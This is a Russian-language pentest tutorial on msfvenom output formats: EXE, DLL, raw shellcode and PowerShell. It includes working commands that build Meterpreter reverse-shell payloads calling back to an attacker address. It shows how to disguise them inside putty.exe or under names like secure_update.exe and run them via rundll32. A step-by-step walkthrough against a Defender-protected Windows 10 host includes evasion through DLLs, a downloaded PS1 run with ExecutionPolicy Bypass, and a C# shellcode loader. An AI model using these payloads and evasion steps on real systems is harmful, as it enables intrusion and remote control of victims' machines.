# Форматы вывода msfvenom: EXE, DLL, Raw Shellcode, PS1

## 1. Место форматов вывода в экосистеме msfvenom и их роль в пентесте

Msfvenom — это автономный генератор полезных нагрузок (payload) в составе Metasploit Framework, заменивший утилиты `msfpayload` и `msfencode` в 2015 году. Он позволяет создавать вредоносный код для широкого спектра платформ и архитектур, упаковывая его в один из предопределённых форматов вывода. Выбор формата определяет способ доставки, механизм выполнения и, как следствие, эффективность всей операции начального доступа.

**Полезная нагрузка и формат — не одно и то же.** Полезная нагрузка (stager или stageless) — это сам исполняемый код, отвечающий за установку соединения или запуск шелла. Формат вывода задаёт, в каком виде этот код будет сохранён, передан и активирован на целевой машине. Одна и та же нагрузка `windows/meterpreter/reverse_tcp` может быть упакована в исполняемый файл `.exe`, динамическую библиотеку `.dll`, сырой машинный код (raw) или скрипт PowerShell `.ps1`. Каждый формат накладывает свои ограничения на целевое окружение и методы исполнения, поэтому специалисту необходимо понимать их различия.

Форматы msfvenom делятся на две большие категории (согласно документации [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfvenom) и [Slayer Labs](https://posts.slayerlabs.com/msfvenom-guide)):

- **Исполняемые форматы (Executable):** результат представляет собой автономный артефакт, готовый к непосредственному запуску на целевом хосте — `.exe`, `.dll`, `.elf`, `.macho` и т.д. Для их активации достаточно штатных средств ОС.
- **Трансформируемые форматы (Transform):** на выходе получается текстовое представление байтового массива или скрипт, который необходимо встроить в другой код, скомпилировать или передать интерпретатору — `raw`, `c`, `python`, `psh`, `psh-cmd` и пр. Эти форматы дают большую гибкость, но требуют ручной адаптации под вектор атаки.

Ниже представлена сравнительная характеристика четырёх ключевых форматов вывода, актуальных для целевых Windows-систем.

| Формат       | Тип           | Расширение / вид                        | Что генерируется                           | Типичный сценарий использования                                                                 | Ограничения и особенности                                          |
|--------------|---------------|-----------------------------------------|---------------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------------------|
| **exe**      | Executable    | `.exe`                                   | Переносимый исполняемый PE-файл с внедрённой нагрузкой | Доставка через email, USB, веб-загрузку; запуск двойным кликом или из командной строки          | Легко детектируется AV при отсутствии обфускации; требует соответствия архитектуры целевой ОС |
| **dll**      | Executable    | `.dll`                                   | Динамическая библиотека Windows с экспортируемой функцией, вызывающей нагрузку | Боковая загрузка, внедрение в легитимный процесс через `rundll32.exe` или `regsvr32.exe`        | Необходим механизм вызова экспорта; сложнее в отладке, но может обходить эвристики исполняемых файлов |
| **raw**      | Transform     | `.bin` или stdout                       | Позиционно-независимый машинный код без заголовков | Встраивание в собственный эксплойт, шеллкод-инжектор, тестирование bypass-техник со специфичными байтами | Требует точного управления памятью и учёта bad-символов; не может быть запущен сам по себе |
| **ps1**      | Transform     | `.ps1` (при `-f psh`), либо stdout для `-f psh-cmd` | PowerShell-скрипт, выполняющий выделение памяти, копирование шеллкода и его запуск | Сценарии, где разрешено выполнение скриптов, фишинг с офисными макросами, обход ограничений на запуск .exe | Зависит от политики выполнения PowerShell и версии; крупные stageless нагрузки делают скрипт громоздким |

**Иллюстративная схема взаимодействия:**
```text
[msfvenom] ──(payload + fmt)──▶ EXE – распространяется, исполняется ОС напрямую
             │
             ├──▶ DLL – загружается rundll32.exe, вызывается экспорт
             ├──▶ RAW – встраивается в эксплойт на C/Python, выполняется в контексте процесса
             └──▶ PS1 – интерпретируется PowerShell, выполняет WinAPI-вызовы
```

Дальнейшие разделы детально разбирают структурные и практические аспекты именно этих четырёх форматов, поскольку они покрывают подавляющее большинство векторов начального доступа на Windows-инфраструктуру в ходе пентеста.

## 2. Внутреннее устройство и генерация EXE, DLL, Raw Shellcode и PS1

Каждый из форматов вывода `msfvenom` имеет уникальную внутреннюю организацию, диктуемую как операционной системой, так и способом, которым полезная нагрузка должна получить управление. Рассмотрим их по отдельности.

### 2.1 Исполняемый файл Windows (EXE)

При указании `-f exe` `msfvenom` формирует валидный PE‑файл (Portable Executable), который ОС Windows способна загрузить как самостоятельный процесс. В простейшем случае (без дополнительных опций) инструмент генерирует минимальный PE-шаблон, содержащий секцию `.text` с шеллкодом, и устанавливает точку входа (`AddressOfEntryPoint`) непосредственно на начало этого кода. Структура такого файла выглядит следующим образом:

- **DOS‑заголовок** (MZ‑сигнатура, указатель на PE‑заголовок).
- **PE‑заголовок** (`PE\0\0`, FileHeader, OptionalHeader с полями `ImageBase`, `EntryPoint`).
- **Таблица секций** (обычно одна секция `.text` с флагами `IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE`).
- **Сырой шеллкод нагрузки**, выровненный по `FileAlignment`.

Встроенный шаблон минимален и не содержит импортов, ресурсов или TLS‑колбэков, что одновременно упрощает выполнение и делает файл подозрительным для антивирусов. Для повышения скрытности `msfvenom` поддерживает инъекцию в существующий легитимный исполняемый файл через параметры `-x <template>` и `-k` (сохранить исходное поведение шаблона, запуская нагрузку в отдельном потоке). В этом случае EntryPoint оригинального файла патчится на переход к внедрённому коду, а затем возвращается к легитимной логике.

Пример сгенерированного PE‑файла можно разобрать утилитой `objdump` (иллюстративно):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o rev.exe
objdump -f rev.exe
```

Типичный вывод содержит архитектуру и точку входа:
```
rev.exe:     file format pei-x86-64
architecture: i386:x86-64, flags 0x00000103:
HAS_RELOC, EXEC_P, D_PAGED
start address 0x0000000000401000
```
Это подтверждает, что весь код расположен в секции, начинающейся по адресу `0x401000`, и выполнение начнётся прямо оттуда.

### 2.2 Динамически подключаемая библиотека (DLL)

Формат `-f dll` также порождает PE‑файл, но с характеристиками DLL (поле `Characteristics` содержит `IMAGE_FILE_DLL`). Ключевое отличие — наличие таблицы экспорта, через которую внешний загрузчик (`rundll32.exe`, `regsvr32.exe`) либо собственный код могут вызвать нагрузку. `msfvenom` автоматически создаёт экспортируемую функцию с именем, обычно `DllRegisterServer` или `Init`, и связывает с ней точку входа шеллкода.

Схема типичной DLL, сгенерированной `msfvenom`:
```
[MZ-заглушка]
[PE-заголовок (Signature, FileHeader, OptionalHeader)]
  Characteristics = IMAGE_FILE_DLL | IMAGE_FILE_EXECUTABLE_IMAGE
  EntryPoint = raw_offset шеллкода
[Секция .text]
  Шеллкод нагрузки
[Секция .edata (экспорт)]
  Export Directory Table
    Name RVA -> "payload.dll"
    OrdinalBase = 1
    Export Address Table -> [EntryPoint]
    Name Pointer Table -> ["DllRegisterServer"]
[Секция .reloc (если требуется)]
```

При вызове `rundll32.exe payload.dll, DllRegisterServer` система загружает DLL, находит в таблице экспорта функцию с указанным ординалом или именем и передаёт ей управление. Функция, сгенерированная `msfvenom`, немедленно исполняет шеллкод. Это позволяет избежать создания отдельного процесса, а код выполняется в контексте `rundll32.exe`, что иногда затрудняет блокировку на основе имени файла.

### 2.3 Сырой шеллкод (Raw)

Формат `-f raw` возвращает полезную нагрузку в виде непрерывной последовательности байт позиционно-независимого машинного кода без каких-либо заголовков или обёрток. Именно этот вид обычно ожидают эксплойты, осуществляющие перехват потока выполнения (EIP/RIP), либо фреймворки, вроде Cobalt Strike и PowerShell‑инжекторов.

Сырой шеллкод должен удовлетворять нескольким инвариантам:
- Не содержать нулевых байт (`\x00`), если атака связана со строковыми функциями (например, `strcpy`). `msfvenom` позволяет исключить заданные байты флагом `-b`.
- Быть полностью позиционно-независимым — использовать относительные адресации и динамическое разрешение API через PEB/Walking.
- Иметь небольшой размер, особенно для stager‑нагрузок (типичный размер `windows/meterpreter/reverse_tcp` — около 300 байт).

Генерация сырого кода:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.5 LPORT=443 \
         -f raw -b '\x00\x0a\x0d' -o meter.bin
```
Для анализа полученного файла можно использовать `hexdump`:
```bash
hexdump -C meter.bin | head -n 8
```
Вывод иллюстрирует начальный трамплин шеллкода (фрагмент):
```
00000000  fc 48 83 e4 f0 e8 cc 00  00 00 41 51 41 50 52 51  |.H........AQAPRQ|
00000010  56 48 31 d2 65 48 8b 52  60 48 8b 52 18 48 8b 52  |VH1.eH.R`H.R.H.R|
...
```
Массив байт можно непосредственно скопировать в заготовку на C, Python или PowerShell, что демонстрирует раздел применения.

### 2.4 Сценарий PowerShell (PS1)

`msfvenom` предлагает несколько производных форматов для PowerShell. Наиболее важные для начального доступа — `psh` (файл `.ps1`) и `psh-cmd` (однострочная команда). При генерации через `-f psh` создаётся полноценный скрипт, содержащий:
- Массив байт шеллкода в виде `[Byte[]] $buf = 0xfc,0x48,0x83,...`.
- Вызов WinAPI функций `VirtualAlloc`, `CreateThread` (или `QueueUserAPC`) через встроенные возможности PowerShell или компиляцию C# кода посредством `Add-Type`.
- Непосредственно копирование байтов в выделенную память и запуск.

Современные версии Metasploit формируют скрипт, использующий динамическую сборку небольшого C#‑фрагмента для обхода AMSI и непосредственного исполнения shellcode. Упрощённая структура (иллюстративная схема):
```powershell
$buf = [System.Convert]::FromBase64String("...base64 представление shellcode...")
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(...)
$f.Invoke($buf, 0, $buf.Length, 0x3000, 0x40)
...
```
(Реальный вывод может отличаться в зависимости от версии Metasploit; флаг `-f psh` гарантирует валидный синтаксис.)

Формат `-f psh-cmd`, напротив, возвращает сжатую строку, пригодную для немедленного встраивания в командную строку PowerShell, обычно с флагом `-EncodedCommand` и base64‑кодированным содержимым. Это удобно для макросов или одноразовых команд.

**Таблица резюмирующая структурные отличия:**

| Характеристика                | EXE                              | DLL                                | Raw                                  | PS1                                      |
|-------------------------------|----------------------------------|------------------------------------|--------------------------------------|------------------------------------------|
| Тип файла                     | PE (.exe)                        | PE (.dll)                          | Бинарный блоб                        | Текстовый скрипт (.ps1)                  |
| Заголовок                     | Полный PE-заголовок              | Полный PE-заголовок + экспорт      | Отсутствует                          | Отсутствует                               |
| Точка входа                   | EntryPoint → шеллкод             | Экспортируемая функция → шеллкод   | Первый байт                          | Вызов VirtualAlloc + CreateThread         |
| Зависимость от ОС             | Загрузчик PE                     | Загрузчик DLL                      | Ручное управление памятью            | PowerShell 2.0+                          |
| Размер stager (примерный)     | ~3–4 КБ                          | ~3–4 КБ                            | ~300–500 байт                        | Несколько КБ текста                      |

## 3. Практическая работа с форматами: генерация, тюнинг и доставка на целевую систему

При пентесте выбор формата — лишь первый шаг. Далее необходимо адаптировать нагрузку под конкретные условия: обойти антивирус, учесть версию ОС, доступный вектор выполнения. Рассмотрим типовые команды и рекомендации для каждого из четырёх форматов.

### 3.1 Исполняемый файл (EXE)

**Базовая генерация:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f exe -o secure_update.exe
```
**Встраивание в шаблон** (использование легитимного файла `putty.exe` для маскировки):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -x putty.exe -k -f exe -o putty_legit.exe
```
Флаг `-k` сохраняет оригинальное поведение: после вызова шеллкода управление возвращается к `putty.exe`. Это позволяет жертве не заподозрить аномалии.

**Советы:**

- Всегда указывайте архитектуру (`-a x86` или `-a x64`), соответствующую целевой ОС. 32-битная полезная нагрузка на 64-битной системе будет работать, но подсистема WoW64 может насторожить системы мониторинга.
- Для обхода статических сигнатур используйте кодирование: `-e x86/shikata_ga_nai -i 5`. Однако помните, что это не панацея — динамические эмуляторы могут развернуть код.
- При использовании шаблона убедитесь, что шаблон не упакован и имеет достаточно свободного места в секциях.

**Запуск на цели**:
```cmd
secure_update.exe
```
или
```cmd
start putty_legit.exe
```

### 3.2 Динамическая библиотека (DLL)

**Генерация:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 \
         -f dll -o proxy_utils.dll
```
Для выполнения DLL необходимо передать её загрузчику и указать экспорт. Экспорт по умолчанию — функция `DllRegisterServer` (или `#1`). Запуск:
```cmd
rundll32.exe proxy_utils.dll, DllRegisterServer
```
При успешном выполнении `rundll32.exe` установит соединение, при этом основной поток DLL останется активным до завершения сессии.

**Альтернативные методы:**
- `regsvr32.exe /s proxy_utils.dll` — если DLL содержит точку входа, подходящую для регистрации сервера.
- **Боковая загрузка DLL**: если удалось разместить DLL в директории программы, ищущей свои зависимости (search order hijacking), код сработает автоматически при запуске легитимного приложения.

**Особенности:**
DLL‑формат часто оказывается «тише» для HIPS, так как исполнение происходит внутри доверенного процесса `rundll32.exe`. Однако некоторые антивирусы сигнатурят именно аномальный вызов `rundll32.exe` с подозрительной DLL.

### 3.3 Сырой шеллкод (Raw)

Raw-формат не предназначен для конечного пользователя — это компонент, встраиваемый в кастомный инжектор или эксплойт.

**Генерация для последующей вставки в C#‑инжектор:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f csharp -o shellcode.cs
```
Формат `csharp` — это одна из «трансформ»-вариаций, представляющая массив байт в синтаксисе C#. Аналогично можно получить код для Python (`-f python`), PowerShell (`-f ps1`) или просто сырой бинарный блоб (`-f raw`), который затем читается в коде.

**Пример интеграции raw в PowerShell (без сохранения в файл):**
Сначала генерируется сырой блоб:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f raw \
         -o payload.bin
```
Далее в PowerShell можно прочитать файл и выполнить (иллюстративный подход, требующий отключённого AMSI):
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\temp\payload.bin")
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, 
               [Action])
$delegate.Invoke()
```
В реальной операции обёртку дорабатывают, добавляя обход AMSI и ETW, но суть остаётся — raw shellcode даёт максимальный контроль.

**Преимущества raw:**
- Минимальный размер, легко умещается в ограничения `-s <размер>`.
- Возможность исключать любые bad-символы под конкретный протокол (HTTP, DNS).
- Универсальность: один и тот же блоб можно внедрять через разные методы (DLL-инжект, CreateRemoteThread, APC и т.д.).

### 3.4 PowerShell-скрипт (PS1)

**Генерация файла скрипта:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f psh -o meter.ps1
```
Содержимое `meter.ps1` будет включать объявление переменной `$buf` и вызов WinAPI. Файл можно выполнить на цели:
```powershell
powershell -ExecutionPolicy Bypass -File meter.ps1
```
Либо через однострочник `-f psh-cmd`:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f psh-cmd
```
Вывод будет примерно таким (иллюстративно):
```
powershell -nop -w hidden -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB... (base64)
```
Эту строку можно немедленно выполнить в терминале, что делает формат чрезвычайно удобным для Remote Code Execution через веб‑Shell или фишинг-ссылку с `cmd /c`.

**Тонкости:**
- Архитектура должна соответствовать разрядности PowerShell: 64-битную нагрузку надо запускать в 64-битной консоли. На 64-битной Windows 32-битная консоль находится по пути `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` — это может быть использовано для принудительного запуска x86‑нагрузки.
- Для обхода политик выполнения можно применять `-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, а для обхода AMSI — предварительную модификацию реестра или «отражение» в памяти. Существуют инструменты вроде [Get-Shellcode](https://github.com/gh0x0st/Get-Shellcode), которые автоматически обфусцируют и разделяют шеллкод в PS1‑файле.
- Слишком большие stageless нагрузки (например, `meterpreter_reverse_https` > 200 КБ) делают файл `.ps1` громоздким, что может мешать в условиях ограниченной пропускной способности.

**Сводная таблица основных сценариев и рекомендаций:**

| Формат | Способ доставки                    | Скрытность | Обход AV (базовый)                  | Требования на цели                                    |
|--------|------------------------------------|------------|-------------------------------------|-------------------------------------------------------|
| EXE    | Email, архив, общий ресурс         | Низкая     | Шаблон + кодирование + упаковка     | Разрешение запуска исполняемых файлов                 |
| DLL    | Боковая загрузка, вложение в архив | Средняя    | Использование легитимного загрузчика | Возможность вызова rundll32 / regsvr32               |
| RAW    | Встраивание в кастомный код        | Высокая    | Только кастомный инжектор           | Контроль над процессом, в который будет внедрён код   |
| PS1    | Макрос, командная строка, LNK      | Средняя    | Обфускация скрипта, in-memory запуск | Доступ к PowerShell, возможность обхода политик       |

## 4. Сквозной практический пример: от выбора формата до активной сессии Meterpreter

Рассмотрим сценарий, приближённый к реальному тестированию на проникновение. Его цель — продемонстрировать, как формат вывода влияет на успех операции и как оператор может переключаться между форматами, адаптируясь к защитным мерам.

**Исходные условия:**
- Атакующий: Kali Linux (IP 192.168.1.10).
- Целевая машина: Windows 10 22H2 x64 с установленным Microsoft Defender, доступом к PowerShell и возможностью запуска исполняемых файлов из папки `Downloads`. Пользователь не имеет административных привилегий, но может сохранять и запускать файлы.
- Задача: получить интерактивную Meterpreter-сессию. Первый подход — EXE, который Defender детектирует; затем применяется DLL; после демонстрации гибкости используется PS1.

**Шаг 1. Неудачная попытка с EXE**

Генерируем простой EXE‑файл:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f exe -o update_tool.exe
```
На целевой машине файл копируется в `Downloads`. При попытке запуска срабатывает сигнатура Defender, файл помещается в карантин. Быстро проверяем детект на VirusTotal (иллюстративно) — высокая детектность. Вывод: наивный EXE не проходит.

**Шаг 2. DLL с кастомным шаблоном**

Пробуем DLL, встроенную в легитимную `calc.exe` (приём, описанный в [cheat-листе](https://0ut3r.space/2024/09/28/worth-checking-3/MSFvenom_Cheat_Sheet.pdf)). Но для DLL шаблоном служит тоже DLL. Создаём DLL с meterpreter:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f dll -o update_lib.dll
```
На атакующей машине поднимаем обработчик:
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.10; set LPORT 443; exploit"
```
На целевой стороне выполняем:
```cmd
rundll32.exe C:\Users\victim\Downloads\update_lib.dll, DllRegisterServer
```
Defender на статический анализ DLL не реагирует, так как отсутствует известная сигнатура, а поведенческий анализ на `rundll32.exe` может не блокировать чистую DLL Meterpreter. В результате в Metasploit появляется активная сессия:

```
[*] Started HTTPS reverse handler on https://192.168.1.10:443
[*] Meterpreter session 1 opened (192.168.1.10:443 -> 192.168.1.5:49802) at 2025-03-15 10:32:17 +0000
```
Это подтверждает работоспособность DLL‑подхода. Но для иллюстрации продолжим.

**Шаг 3. PS1 для бесфайловой атаки**

Генерируем PowerShell‑скрипт:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f psh -o meter.ps1
```
Загружаем скрипт на целевую машину через HTTP‑сервер:
```bash
# на Kali
python3 -m http.server 8080
# на цели
powershell -c "Invoke-WebRequest -Uri http://192.168.1.10:8080/meter.ps1 -OutFile meter.ps1"
```
Запускаем:
```powershell
powershell -ExecutionPolicy Bypass -File meter.ps1
```
Мгновенно получаем вторую сессию:
```
[*] Meterpreter session 2 opened ...
```
Этот метод не оставляет артефакта в виде PE‑файла в файловой системе, а выполняется в памяти PowerShell, что усложняет форензику и может обходить некоторые HIPS.

**Шаг 4. Сравнение и использование raw shellcode**

Для демонстрации универсальности сгенерируем сырой шеллкод и внедрим его в кастомный C#‑исполняемый файл, скомпилированный на цели. Генерируем код на C#:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 \
         -f csharp -o shellcode.cs
```
Файл `shellcode.cs` содержит массив `byte[] buf = new byte[512] { 0xfc,0x48,... }`. Создаём простейший загрузчик (файл `loader.cs`):
```csharp
using System;
using System.Runtime.InteropServices;
class Program {
    static void Main() {
        byte[] buf = ... // сюда вставить содержимое shellcode.cs
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr lpAddr, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr lpThreadAttr, uint dwStackSize, IntPtr lpStartAddr, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
```
Компиляция на целевом компьютере (если доступен `csc.exe`):
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:loader.exe loader.cs
loader.exe
```
В результате — ещё одна сессия Meterpreter. Этот пример показывает, как сырой шеллкод может быть встроен в произвольный код, скомпилированный на месте, что полезно, когда стандартные форматы не проходят.

**Ожидаемый вывод из сквозного примера:**
Ни один формат не является универсальным; успех зависит от защитных средств, контекста выполнения и способа доставки. Гибкость `msfvenom` позволяет оперативно переключаться с `exe` на `dll` или `ps1`, а при необходимости — использовать сырой шеллкод для кастомного внедрения. Практическое владение каждым форматом и понимание его внутреннего устройства необходимо для эффективного пентеста.
